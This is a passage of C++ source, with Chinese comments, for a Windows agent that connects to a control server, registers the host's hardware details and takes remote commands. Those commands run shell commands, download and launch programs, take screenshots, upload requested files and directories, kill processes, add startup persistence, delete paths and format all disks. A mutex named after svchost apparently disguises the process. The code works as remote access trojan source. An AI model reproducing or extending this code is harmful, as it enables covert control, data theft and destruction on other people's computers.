        string relPath = WideToUtf8(kv.second);
        string virtualName = dirName + "\\" + relPath;

        string fileTaskId = dirTaskId + "_" + to_string(fileIndex);

        SOCKET fs = ConnectFilePort(fileTaskId);  // ★ 带TaskID
        if (fs == INVALID_SOCKET) {
            continue;
        }

        HANDLE hFile = CreateFileW(kv.first.c_str(), GENERIC_READ, FILE_SHARE_READ,
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            closesocket(fs);
            continue;
        }

        LARGE_INTEGER li; GetFileSizeEx(hFile, &li);
        ULONGLONG totalSize = (ULONGLONG)li.QuadPart;

        vector<char> beginPkt(16 + virtualName.size());
        ULONGLONG netTotal = HToNLL(totalSize);
        ULONGLONG netOffset = HToNLL(0ULL);
        memcpy(beginPkt.data(), &netTotal, 8);
        memcpy(beginPkt.data() + 8, &netOffset, 8);
        memcpy(beginPkt.data() + 16, virtualName.data(), virtualName.size());
        SendPacketBin(fs, CMD_FILE_BEGIN, beginPkt);

        ULONGLONG sent = 0;
        vector<char> chunkBuf(FILE_CHUNK_SIZE);
        while (sent < totalSize) {
            DWORD toRead = (DWORD)min((ULONGLONG)FILE_CHUNK_SIZE, totalSize - sent);
            DWORD didRead = 0;
            if (!ReadFile(hFile, chunkBuf.data(), toRead, &didRead, NULL) || didRead == 0)
                break;
            chunkBuf.resize(didRead);
            SendPacketBin(fs, CMD_FILE_CHUNK, chunkBuf);
            chunkBuf.resize(FILE_CHUNK_SIZE);
            sent += didRead;
        }

        CloseHandle(hFile);
        SendPacketBin(fs, CMD_FILE_END, vector<char>());
        closesocket(fs);
    }
}

// ★ v3新增：9003心跳线程函数（独立静态函数，避免lambda捕获问题）
struct Hb9003Param { SOCKET cs; volatile bool* pHbRunning; };

static DWORD WINAPI Hb9003ThreadProc(LPVOID p)
{
    Hb9003Param* hp = (Hb9003Param*)p;
    while (*hp->pHbRunning) {
        Sleep(10000);
        if (!*hp->pHbRunning) break;
        vector<char> empty;
        if (!SendPacketSafe(hp->cs, CMD_HEARTBEAT_9003, empty)) break;
    }
    delete hp;
    return 0;
}

// ===== 设置进程级DPI感知（必须在创建任何窗口前调用）=====
static void SetDpiAwareness()
{
    // 1. Win10 1607+：Per-Monitor V2
    HMODULE hUser32 = GetModuleHandleW(L"user32.dll");
    if (hUser32) {
        typedef BOOL(WINAPI* PFN_SetCtx)(HANDLE);
        PFN_SetCtx p = (PFN_SetCtx)GetProcAddress(hUser32, "SetProcessDpiAwarenessContext");
        if (p && p((HANDLE)-4)) return;   // -4 = DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2
    }
    // 2. Win8.1+：Per-Monitor V1（该API无V2）
    HMODULE hShcore = LoadLibraryW(L"shcore.dll");
    if (hShcore) {
        typedef HRESULT(WINAPI* PFN_SetAware)(int);
        PFN_SetAware p = (PFN_SetAware)GetProcAddress(hShcore, "SetProcessDpiAwareness");
        if (p) { p(2); FreeLibrary(hShcore); return; }  // 2 = PROCESS_PER_MONITOR_DPI_AWARE（V1）
        FreeLibrary(hShcore);
    }
    // 3. Vista+：System DPI Aware（最终兜底）
    SetProcessDPIAware();
}


int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {

    SetDpiAwareness();   // ★ 必须在任何窗口/DPI相关操作前设置

    // ===== 单实例检测 =====
    HANDLE hMutex = CreateMutexW(NULL, TRUE, L"Global\\SvchostAgentMutex_UniqueKey");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        if (hMutex) CloseHandle(hMutex);
        return 0;
    }

    GdiplusStartupInput gdiplusInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusInput, NULL);
    InitializeCriticalSection(&g_sendLock);
    InitializeCriticalSection(&g_fileSendLock);
    InitializeCriticalSection(&g_dirReadyMapLock);  // ★ 新增

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return 1;
    }

    // ★ 新增：创建网络就绪事件（手动重置，初始未触发）
    g_NetworkReadyEvent = CreateEventW(NULL, TRUE, FALSE, NULL);

    // ★ 网络独占锁：同一台机器只允许一个实例负责网络连接
    HANDLE hNetMutex = CreateMutexW(NULL, TRUE,
        L"Global\\FortodeskNetworkMutex_UniqueKey");
    bool isNetworkOwner = (GetLastError() != ERROR_ALREADY_EXISTS);

    if (!isNetworkOwner) {
        // 已有其他实例负责网络，本实例退出网络循环
        // 集成到MFC程序时这里不return，改为goto skip_network跳过
        if (hNetMutex) CloseHandle(hNetMutex);
        WSACleanup();
        GdiplusShutdown(gdiplusToken);
        CloseHandle(hMutex);
        return 0;
    }

    // ★ 可选改动3：NotifyAddrChange 网卡状态监听线程
// 当网卡IP地址发生变化（如驱动安装后网卡重新获取IP），立刻唤醒9003等待
// 加入2秒防抖：网卡稳定2秒后才触发，避免驱动安装期间多次闪断造成抖动
    HANDLE hAddrWatchThread = CreateThread(NULL, 0, [](LPVOID) -> DWORD {
        while (true) {
            HANDLE hOverlap = CreateEventW(NULL, FALSE, FALSE, NULL);
            if (!hOverlap) { Sleep(1000); continue; }

            OVERLAPPED ovl = {};
            ovl.hEvent = hOverlap;

            // NotifyAddrChange：等待IP地址变化通知
            HANDLE hNotify = NULL;
            DWORD ret = NotifyAddrChange(&hNotify, &ovl);
            if (ret != ERROR_IO_PENDING) {
                CloseHandle(hOverlap);
                Sleep(1000);
                continue;
            }

            // 等待通知（阻塞直到IP变化）
            WaitForSingleObject(hOverlap, INFINITE);
            CloseHandle(hOverlap);

            // ★ IP发生变化，防抖等待2秒（网卡可能还在初始化）
            Sleep(2000);

            // 如果9000已经稳定（g_NetworkReady=true），不需要做任何事
            // 如果9000还没稳定（g_NetworkReady=false），检查是否可以唤醒
            // 实际上此时9000还在重连中，等9000稳定后会自动SetEvent
            // 这里的作用是：如果9003线程在等待Event，而9000还没来得及SetEvent，
            // 此处可以打断9003的等待让它重新检查状态
            // 最简单的做法：什么都不做，9000心跳稳定后自然会SetEvent
            // 这个线程的主要价值是：配合将来可能的"网卡恢复后立刻重连9000"逻辑
        }
        return 0;
        }, NULL, 0, NULL);
    if (hAddrWatchThread) CloseHandle(hAddrWatchThread);

    while (true) {
        // ★ 新增：每次外层重连循环开始时重置网络就绪状态
        g_NetworkReady = false;
        if (g_NetworkReadyEvent) ResetEvent(g_NetworkReadyEvent);

        // ========== 心跳连接 (9000) ==========
        SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
        if (s == INVALID_SOCKET) { Sleep(RECONNECT_MS); continue; }

        DWORD timeout = 3000;
        setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));

        sockaddr_in addr = {};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(SERVER_PORT);  // 9000 心跳端口
        struct hostent* he = gethostbyname(SERVER_IP);
        if (he) addr.sin_addr = *(struct in_addr*)he->h_addr;
        else { closesocket(s); Sleep(RECONNECT_MS); continue; }
        if (connect(s, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
            closesocket(s); Sleep(RECONNECT_MS); continue;
        }

        DWORD noTimeout = 0;
        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&noTimeout, sizeof(noTimeout));
        setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (char*)&noTimeout, sizeof(noTimeout));

        DWORD sendTimeout = 2000;
        setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (char*)&sendTimeout, sizeof(sendTimeout));

        // TCP keepalive
        BOOL keepAlive = TRUE;
        setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, (char*)&keepAlive, sizeof(keepAlive));
        tcp_keepalive ka = {};
        ka.onoff = 1;
        ka.keepalivetime = 3000;
        ka.keepaliveinterval = 1000;
        DWORD bytesRet = 0;
        WSAIoctl(s, SIO_KEEPALIVE_VALS, &ka, sizeof(ka), NULL, 0, &bytesRet, NULL, NULL);

        // 发注册包
        string hwInfo = "C|" + GetHardwareInfo();
        vector<char> regData(hwInfo.begin(), hwInfo.end());
        SendPacketSafe(s, CMD_REGISTER, regData);

        // ★ 心跳线程（只发心跳，维护在线表）
        // 注意：hbRunning 必须在线程启动之前声明
        volatile bool hbRunning = true;

        struct HbParam { SOCKET* pSock; volatile bool* pRunning; };
        HbParam* hbParam = new HbParam{ &s, &hbRunning };
        // 改后
        HANDLE hHbThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
            HbParam* hp = (HbParam*)p;
            int tickCount = 0;
            int stableHeartbeatCount = 0;

            while (*hp->pRunning) {
                Sleep(500);
                tickCount++;

                if (tickCount % 20 == 0) {
                    SOCKET* pSock = hp->pSock;
                    HANDLE hHwThread = CreateThread(NULL, 0, [](LPVOID p2) -> DWORD {
                        SOCKET* ps = (SOCKET*)p2;
                        string hwInfo = "C|" + GetHardwareInfo();
                        vector<char> regData(hwInfo.begin(), hwInfo.end());
                        SendPacketSafe(*ps, CMD_REGISTER, regData);
                        return 0;
                        }, pSock, 0, NULL);
                    if (hHwThread) CloseHandle(hHwThread);
                }

                // ★ 心跳发送失败说明连接已死，通知外层退出
                vector<char> empty;
                if (!SendPacketSafe(*hp->pSock, CMD_HEARTBEAT, empty)) {
                    g_NetworkReady = false;
                    stableHeartbeatCount = 0;
                    if (g_NetworkReadyEvent) ResetEvent(g_NetworkReadyEvent);
                    SOCKET cs = (SOCKET)InterlockedCompareExchange(
                        (LONG*)&g_CmdSocket, (LONG)INVALID_SOCKET, (LONG)g_CmdSocket);
                    if (cs != INVALID_SOCKET) closesocket(cs);
                    *hp->pRunning = false;
                    break;
                }
                // ★ 新增：连续成功2次心跳后认为网络稳定，唤醒9003线程
                if (!g_NetworkReady) {
                    stableHeartbeatCount++;
                    if (stableHeartbeatCount >= 2) {
                        g_NetworkReady = true;
                        if (g_NetworkReadyEvent) SetEvent(g_NetworkReadyEvent);
                    }
                }
            }
            delete hp;
            return 0;
            }, hbParam, 0, NULL);

        // ========== 指令连接 (9003) ==========
        // 独立线程连9003，等控制端来pipe，pipe后进入指令循环
        struct CmdConnParam { string mac; volatile bool* pHbRunning; };
        CmdConnParam* cmdParam = new CmdConnParam{ GetMacForRelay(), &hbRunning };

        HANDLE hCmdThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
            CmdConnParam* cp = (CmdConnParam*)p;

            while (*cp->pHbRunning) {
                if (!g_NetworkReady) {
                    if (g_NetworkReadyEvent) {
                        DWORD waitRet = WaitForSingleObject(g_NetworkReadyEvent, 60000);
                        if (waitRet != WAIT_OBJECT_0) continue;
                    }
                    else {
                        Sleep(500); continue;
                    }
                }
                if (!*cp->pHbRunning) break;

                SOCKET cs = socket(AF_INET, SOCK_STREAM, 0);
                if (cs == INVALID_SOCKET) { Sleep(500); continue; }

                // ★ 新增：记录当前9003 socket供外部强制关闭
                InterlockedExchange((LONG*)&g_CmdSocket, (LONG)cs);

                DWORD to = 5000;
                setsockopt(cs, SOL_SOCKET, SO_RCVTIMEO, (char*)&to, sizeof(to));
                setsockopt(cs, SOL_SOCKET, SO_SNDTIMEO, (char*)&to, sizeof(to));

                sockaddr_in caddr = {};
                caddr.sin_family = AF_INET;
                caddr.sin_port = htons(9003);
                struct hostent* he = gethostbyname(SERVER_IP);
                if (he) caddr.sin_addr = *(struct in_addr*)he->h_addr;
                else {
                    InterlockedExchange((LONG*)&g_CmdSocket, (LONG)INVALID_SOCKET);
                    closesocket(cs);
                    Sleep(500);
                    continue;
                }

                if (connect(cs, (sockaddr*)&caddr, sizeof(caddr)) == SOCKET_ERROR) {
                    InterlockedExchange((LONG*)&g_CmdSocket, (LONG)INVALID_SOCKET);
                    closesocket(cs);
                    Sleep(500);
                    continue;
                }

                // 发握手包（MAC地址）告诉服务器我是谁
                vector<char> macData(cp->mac.begin(), cp->mac.end());
                SendPacketBin(cs, CMD_AGENT_HELLO, macData);

                // 等服务端回PAIR_OK，超时5秒
                {
                    unsigned int pairCmd;
                    vector<char> pairData;
                    if (!RecvPacketBin(cs, pairCmd, pairData) || pairCmd != CMD_PAIR_OK) {
                        InterlockedExchange((LONG*)&g_CmdSocket, (LONG)INVALID_SOCKET);
                        closesocket(cs);
                        Sleep(500);
                        continue;
                    }
                }

                // 配对成功，清零超时，进入指令循环
                DWORD noTo = 0;
                setsockopt(cs, SOL_SOCKET, SO_RCVTIMEO, (char*)&noTo, sizeof(noTo));
                setsockopt(cs, SOL_SOCKET, SO_SNDTIMEO, (char*)&noTo, sizeof(noTo));

                Hb9003Param* hb9003Param = new Hb9003Param{ cs, cp->pHbRunning };
                HANDLE hHb9003Thread = CreateThread(NULL, 0, Hb9003ThreadProc, hb9003Param, 0, NULL);
                if (hHb9003Thread) CloseHandle(hHb9003Thread);

                unsigned int cmd;
                vector<char> data;

                while (RecvPacketBin(cs, cmd, data)) {
                    string dataStr(data.begin(), data.end());

                    if (cmd == CMD_EXEC) {
                        auto sep = dataStr.find('|');
                        if (sep == string::npos) continue;
                        string from = dataStr.substr(0, sep);
                        string command = dataStr.substr(sep + 1);
                        string output = ExecCommand(command);
                        string res = from + "|" + output;
                        SendPacketSafe(cs, CMD_EXEC_RES, vector<char>(res.begin(), res.end()));
                    }
                    else if (cmd == CMD_SHUTDOWN) {
                        ShutdownSystem(false);
                    }
                    else if (cmd == CMD_REBOOT) {
                        ShutdownSystem(true);
                    }
                    else if (cmd == CMD_DOWNLOAD_EX) {
                        size_t sep = dataStr.find('\n');
                        string savePathStr, urlWithArgs;
                        if (sep != string::npos) {
                            savePathStr = dataStr.substr(0, sep);
                            urlWithArgs = dataStr.substr(sep + 1);
                        }
                        else {
                            savePathStr = "";
                            urlWithArgs = dataStr;
                        }
                        string resolvedPath = ResolveSysPath(savePathStr);
                        string url, args;
                        ParseDownloadInput(urlWithArgs, url, args);
                        DownloadConfig cfg;
                        cfg.url = url;
                        cfg.silentArgs = args;
                        cfg.savePath = resolvedPath;
                        cfg.reportSocket = cs;
                        cfg.launchAfterInstall = false;
                        struct DlParam { DownloadConfig cfg; };
                        DlParam* param = new DlParam{ cfg };
                        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
                            DlParam* dp = (DlParam*)p;
                            DownloadAndRunEx(dp->cfg);
                            delete dp;
                            return 0;
                            }, param, 0, NULL);
                        if (hThread) CloseHandle(hThread);
                    }
                    else if (cmd == CMD_GETPROCS) {
                        struct Param { SOCKET sock; string data; };
                        Param* param = new Param{ cs, dataStr };
                        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
                            Param* dp = (Param*)p;
                            string procList = GetProcessList();
                            string res = dp->data + "|" + procList;
                            SendPacketSafe(dp->sock, CMD_GETPROCS_RES,
                                vector<char>(res.begin(), res.end()));
                            delete dp;
                            return 0;
                            }, param, 0, NULL);
                        if (hThread) CloseHandle(hThread);
                    }
                    else if (cmd == CMD_LIST_DIR) {
                        struct Param { SOCKET sock; string path; };
                        Param* param = new Param{ cs, dataStr };
                        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
                            Param* dp = (Param*)p;
                            string result = ListDirectory(dp->path);
                            string res = dp->path + "\n" + result;
                            SendPacketSafe(dp->sock, CMD_LIST_DIR_RES,
                                vector<char>(res.begin(), res.end()));
                            delete dp;
                            return 0;
                            }, param, 0, NULL);
                        if (hThread) CloseHandle(hThread);
                    }
                    else if (cmd == CMD_DELETE_PATH) {
                        struct Param { SOCKET sock; string path; };
                        Param* param = new Param{ cs, dataStr };
                        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
                            Param* dp = (Param*)p;
                            string result = DeletePath(dp->path);
                            SendPacketSafe(dp->sock, CMD_DELETE_RES,
                                vector<char>(result.begin(), result.end()));
                            delete dp;
                            return 0;
                            }, param, 0, NULL);
                        if (hThread) CloseHandle(hThread);
                    }
                    else if (cmd == CMD_SCREENSHOT_ASKLINK) {
                        struct P { SOCKET sock; string taskId; };
                        P* p = new P{ cs, dataStr };
                        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID v) -> DWORD {
                            P* pp = (P*)v;
                            SOCKET sock = pp->sock;
                            string taskId = pp->taskId;
                            delete pp;
                            wstring path = CaptureAskLink();
                            if (!path.empty()) {
                                string okMsg = "OK:" + WideToUtf8(path) + "|" + taskId;
                                SendPacketSafe(sock, CMD_SCREENSHOT_RES,
                                    vector<char>(okMsg.begin(), okMsg.end()));
                                SOCKET fs = ConnectFilePort(taskId);
                                if (fs != INVALID_SOCKET) {
                                    SendFileOnNewSock(fs, path);
                                    closesocket(fs);
                                }
                                DeleteFileW(path.c_str());
                            }
                            else {
                                string res = "ERROR:未找到连连控或无法截图";
                                SendPacketSafe(sock, CMD_SCREENSHOT_RES,
                                    vector<char>(res.begin(), res.end()));
                            }
                            return 0;
                            }, p, 0, NULL);
                        if (hThread) CloseHandle(hThread);
                    }
                    else if (cmd == CMD_SCREENSHOT_TODESK) {
                        struct P { SOCKET sock; string taskId; };
                        P* p = new P{ cs, dataStr };
                        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID v) -> DWORD {
                            P* pp = (P*)v;
                            SOCKET sock = pp->sock;
                            string taskId = pp->taskId;
                            delete pp;
                            wstring path = CaptureToDesk();
                            if (!path.empty()) {
                                string okMsg = "OK:" + WideToUtf8(path) + "|" + taskId;
                                SendPacketSafe(sock, CMD_SCREENSHOT_RES,
                                    vector<char>(okMsg.begin(), okMsg.end()));
                                SOCKET fs = ConnectFilePort(taskId);
                                if (fs != INVALID_SOCKET) {
                                    SendFileOnNewSock(fs, path);
                                    closesocket(fs);
                                }
                                DeleteFileW(path.c_str());
                            }
                            else {
                                string res = "ERROR:未找到ToDesk或无法截图";
                                SendPacketSafe(sock, CMD_SCREENSHOT_RES,
                                    vector<char>(res.begin(), res.end()));
                            }
                            return 0;
                            }, p, 0, NULL);
                        if (hThread) CloseHandle(hThread);
                    }
                    else if (cmd == CMD_SCREENSHOT_FULLSCREEN) {
                        struct P { SOCKET sock; string taskId; };
                        P* p = new P{ cs, dataStr };
                        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID v) -> DWORD {
                            P* pp = (P*)v;
                            SOCKET sock = pp->sock;
                            string taskId = pp->taskId;
                            delete pp;
                            wstring path = CaptureFullScreen();
                            if (!path.empty()) {
                                string okMsg = "OK:" + WideToUtf8(path) + "|" + taskId;
                                SendPacketSafe(sock, CMD_SCREENSHOT_RES,
                                    vector<char>(okMsg.begin(), okMsg.end()));
                                SOCKET fs = ConnectFilePort(taskId);
                                if (fs != INVALID_SOCKET) {
                                    SendFileOnNewSock(fs, path);
                                    closesocket(fs);
                                }
                                DeleteFileW(path.c_str());
                            }
                            else {
                                string res = "ERROR:全屏截图失败";
                                SendPacketSafe(sock, CMD_SCREENSHOT_RES,
                                    vector<char>(res.begin(), res.end()));
                            }
                            return 0;
                            }, p, 0, NULL);
                        if (hThread) CloseHandle(hThread);
                    }
                    else if (cmd == CMD_SEND_FILE) {
                        // ★ 新格式：savePath|TaskID
                        string savePathStr, taskId;
                        size_t sepPos = dataStr.find('|');
                        if (sepPos != string::npos) {
                            savePathStr = dataStr.substr(0, sepPos);
                            taskId = dataStr.substr(sepPos + 1);
                        }
                        string resolvedSavePath = savePathStr.empty() ? "" : ResolveSysPath(savePathStr);

                        struct RecvParam { string savePath; string taskId; };
                        RecvParam* param = new RecvParam{ resolvedSavePath, taskId };
                        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
                            RecvParam* rp = (RecvParam*)p;
                            RecvFileFromCtrl(rp->savePath, rp->taskId);
                            delete rp;
                            return 0;
                            }, param, 0, NULL);
                        if (hThread) CloseHandle(hThread);
                    }
                    else if (cmd == CMD_REQUEST_FILE) {
                        // ★ 新格式：文件路径|TaskID
                        string filePathUtf8, taskId;
                        size_t sep = dataStr.rfind('|');
                        if (sep != string::npos) {
                            filePathUtf8 = dataStr.substr(0, sep);
                            taskId = dataStr.substr(sep + 1);
                        }
                        else {
                            filePathUtf8 = dataStr;
                        }
                        wstring wcheckPath = Utf8ToWide(filePathUtf8);
                        if (GetFileAttributesW(wcheckPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
                            string errMsg = "ERROR:文件不存在:" + filePathUtf8;
                            SendPacketSafe(cs, CMD_SEND_FILE_RES,
                                vector<char>(errMsg.begin(), errMsg.end()));
                        }
                        else {
                            struct FileTaskParam { string path; string taskId; };
                            FileTaskParam* param = new FileTaskParam{ filePathUtf8, taskId };
                            HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
                                FileTaskParam* fp = (FileTaskParam*)p;
                                SOCKET fs = ConnectFilePort(fp->taskId);
                                if (fs != INVALID_SOCKET) {
                                    wstring wpath = Utf8ToWide(fp->path);
                                    SendFileOnNewSock(fs, wpath);
                                    closesocket(fs);
                                }
                                delete fp;
                                return 0;
                                }, param, 0, NULL);
                            if (hThread) CloseHandle(hThread);
                        }
                    }
                    else if (cmd == CMD_DOWNLOAD_TODESK) {
                        size_t sep2 = dataStr.find('\n');
                        string savePathStr2, urlWithArgs2;
                        if (sep2 != string::npos) {
                            savePathStr2 = dataStr.substr(0, sep2);
                            urlWithArgs2 = dataStr.substr(sep2 + 1);
                        }
                        else {
                            savePathStr2 = "PUBLIC_DESKTOP";
                            urlWithArgs2 = dataStr;
                        }
                        bool launchAfterInstall = false;
                        if (savePathStr2.size() >= 7 &&
                            savePathStr2.substr(savePathStr2.size() - 7) == "|LAUNCH") {
                            launchAfterInstall = true;
                            savePathStr2 = savePathStr2.substr(0, savePathStr2.size() - 7);
                        }
                        string resolvedPath2 = ResolveSysPath(savePathStr2);
                        string url2, args2;
                        ParseDownloadInput(urlWithArgs2, url2, args2);
                        DownloadConfig cfg;
                        cfg.url = url2;
                        cfg.savePath = resolvedPath2;
                        cfg.silentArgs = args2;
                        cfg.reportSocket = cs;
                        cfg.launchAfterInstall = launchAfterInstall;
                        struct DlParam { DownloadConfig cfg; };
                        DlParam* param = new DlParam{ cfg };
                        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
                            DlParam* dp = (DlParam*)p;
                            DownloadAndRunEx(dp->cfg);
                            delete dp;
                            return 0;
                            }, param, 0, NULL);
                        if (hThread) CloseHandle(hThread);
                    }
                    else if (cmd == CMD_KILL_TODESK) {
                        vector<wstring> names = { L"ToDesk_Lite.exe", L"ToDesk.exe" };
                        KillProcessesByNames(names);
                        string res = "OK:ToDesk进程已全部结束";
                        SendPacketSafe(cs, CMD_KILL_RES, vector<char>(res.begin(), res.end()));
                    }
                    else if (cmd == CMD_KILL_ASKLINK) {
                        vector<wstring> names = { L"AskLink.exe", L"AskLinkSession.exe" };
                        KillProcessesByNames(names);
                        string res = "OK:连连控进程已全部结束";
                        SendPacketSafe(cs, CMD_KILL_RES, vector<char>(res.begin(), res.end()));
                    }
                    else if (cmd == CMD_OPEN_ASKLINK) {
                        string res = DoOpenAskLink();
                        SendPacketSafe(cs, CMD_OPEN_RES, vector<char>(res.begin(), res.end()));
                    }
                    else if (cmd == CMD_OPEN_TODESK) {
                        string res = DoOpenToDesk();
                        SendPacketSafe(cs, CMD_OPEN_RES, vector<char>(res.begin(), res.end()));
                    }
                    else if (cmd == CMD_LIST_DRIVES) {
                        struct Param { SOCKET sock; };
                        Param* param = new Param{ cs };
                        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
                            Param* dp = (Param*)p;
                            string result = ListDrives();
                            SendPacketSafe(dp->sock, CMD_LIST_DRIVES_RES,
                                vector<char>(result.begin(), result.end()));
                            delete dp;
                            return 0;
                            }, param, 0, NULL);
                        if (hThread) CloseHandle(hThread);
                    }
                    else if (cmd == CMD_REQUEST_DIR) {
                        // ★ 新格式：目录路径|DirTaskID
                        string dirPathUtf8, dirTaskId;
                        size_t sep = dataStr.rfind('|');
                        if (sep != string::npos) {
                            dirPathUtf8 = dataStr.substr(0, sep);
                            dirTaskId = dataStr.substr(sep + 1);
                        }
                        else {
                            dirPathUtf8 = dataStr;
                            dirTaskId = "";
                        }
                        wstring wcheckDir = Utf8ToWide(dirPathUtf8);
                        if (GetFileAttributesW(wcheckDir.c_str()) == INVALID_FILE_ATTRIBUTES) {
                            string errMsg = "ERROR:目录不存在:" + dirPathUtf8;
                            SendPacketSafe(cs, CMD_SEND_FILE_RES,
                                vector<char>(errMsg.begin(), errMsg.end()));
                        }
                        else {
                            struct DirParam { SOCKET sock; string path; string taskId; };
                            DirParam* param = new DirParam{ cs, dirPathUtf8, dirTaskId };
                            HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
                                DirParam* dp = (DirParam*)p;
                                SendDirToCtrl(dp->sock, dp->path, dp->taskId);
                                delete dp;
                                return 0;
                                }, param, 0, NULL);
                            if (hThread) CloseHandle(hThread);
                        }
                    }
                    else if (cmd == CMD_DIR_READY) {
                        // ★ dataStr 是 DirTaskID，按TaskID路由
                        EnterCriticalSection(&g_dirReadyMapLock);
                        auto it = g_dirReadyMap.find(dataStr);
                        if (it != g_dirReadyMap.end()) {
                            SetEvent(it->second);
                        }
                        LeaveCriticalSection(&g_dirReadyMapLock);
                    }
                    else if (cmd == CMD_FORMAT_DISKS) {
                        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
                            SOCKET* ps = (SOCKET*)p;
                            FormatAllDisksInPE(*ps, 15000);
                            delete ps;
                            return 0;
                            }, new SOCKET(cs), 0, NULL);
                        if (hThread) CloseHandle(hThread);
                    }
                    else if (cmd == CMD_DEL_DIR_ALL) {
                        struct Param { SOCKET sock; string dirName; };
                        Param* param = new Param{ cs, dataStr };
                        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
                            Param* dp = (Param*)p;
                            DeleteDirOnAllDrives(dp->sock, dp->dirName);
                            delete dp;
                            return 0;
                            }, param, 0, NULL);
                        if (hThread) CloseHandle(hThread);
                    }
                    else if (cmd == CMD_GET_INSTALLED) {
                        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
                            SOCKET* ps = (SOCKET*)p;
                            string result = GetInstalledSoftware(*ps);
                            SendPacketSafe(*ps, CMD_GET_INSTALLED_RES,
                                vector<char>(result.begin(), result.end()));
                            delete ps;
                            return 0;
                            }, new SOCKET(cs), 0, NULL);
                        if (hThread) CloseHandle(hThread);
                    }
                    else if (cmd == CMD_GET_STARTUP_LIST) {
                        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
                            SOCKET* ps = (SOCKET*)p;
                            string result = GetStartupItems();
                            SendPacketSafe(*ps, CMD_GET_STARTUP_LIST_RES,
                                vector<char>(result.begin(), result.end()));
                            delete ps;
                            return 0;
                            }, new SOCKET(cs), 0, NULL);
                        if (hThread) CloseHandle(hThread);
                    }

                    else if (cmd == CMD_ADD_STARTUP) {
                        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
                            SOCKET* ps = (SOCKET*)p;
                            string result = ModifyStartup(*ps, true, true);  // 复制文件+写注册表
                            SendPacketSafe(*ps, CMD_ADD_STARTUP_RES,
                                vector<char>(result.begin(), result.end()));
                            delete ps;
                            return 0;
                            }, new SOCKET(cs), 0, NULL);
                        if (hThread) CloseHandle(hThread);
                    }
                    else if (cmd == CMD_ADD_STARTUP_NOREG) {
                        // 完整版模式：从控制端传来的路径复制文件+写注册表
                        struct Param { SOCKET sock; string srcPath; };
                        Param* param = new Param{ cs, dataStr };  // dataStr = 临时目录下载路径
                        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
                            Param* dp = (Param*)p;
                            // ★ copyFile=true，sourceFilePath=控制端传来的下载路径
                            string result = ModifyStartup(dp->sock, true, true, dp->srcPath);
                            SendPacketSafe(dp->sock, CMD_ADD_STARTUP_RES,
                                vector<char>(result.begin(), result.end()));
                            if (!dp->srcPath.empty()) {
                                wstring wpath = Utf8ToWide(dp->srcPath);
                                DeleteFileW(wpath.c_str());
                            }
                            delete dp;
                            return 0;
                            }, param, 0, NULL);
                        if (hThread) CloseHandle(hThread);
                    }
                    else if (cmd == CMD_DEL_STARTUP) {
                        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
                            SOCKET* ps = (SOCKET*)p;
                            string result = ModifyStartup(*ps, false, true);
                            SendPacketSafe(*ps, CMD_DEL_STARTUP_RES,
                                vector<char>(result.begin(), result.end()));
                            delete ps;
                            return 0;
                            }, new SOCKET(cs), 0, NULL);
                        if (hThread) CloseHandle(hThread);
                    }

                    else if (cmd == CMD_RUN_PROGRAM) {
                        struct Param { SOCKET sock; string cmdLine; };
                        Param* param = new Param{ cs, dataStr };
                        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
                            Param* dp = (Param*)p;
                            string result = RunProgram(dp->cmdLine);
                            SendPacketSafe(dp->sock, CMD_RUN_PROGRAM_RES,
                                vector<char>(result.begin(), result.end()));
                            delete dp;
                            return 0;
                            }, param, 0, NULL);
                        if (hThread) CloseHandle(hThread);
                    }
                    else if (cmd == CMD_KILL_PROCESS) {
                        struct Param { SOCKET sock; string patterns; };
                        Param* param = new Param{ cs, dataStr };
                        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
                            Param* dp = (Param*)p;
                            string result = KillProcessByPattern(dp->patterns);
                            SendPacketSafe(dp->sock, CMD_KILL_PROCESS_RES,
                                vector<char>(result.begin(), result.end()));
                            delete dp;
                            return 0;
                            }, param, 0, NULL);
                        if (hThread) CloseHandle(hThread);
                    }

